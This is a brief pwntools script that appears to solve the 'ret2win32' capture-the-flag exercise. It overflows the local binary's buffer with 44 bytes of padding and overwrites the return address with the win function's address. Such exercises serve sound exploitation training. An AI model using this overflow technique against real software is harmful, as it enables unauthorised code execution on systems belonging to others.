# -*- coding: utf-8 -*-
from pwn import *
p = process('./ret2win32')
p.recvuntil("> ")
win = 0x8048659
payload = "a" * 44 + p32(win)
p.sendline(payload)
p.interactive()


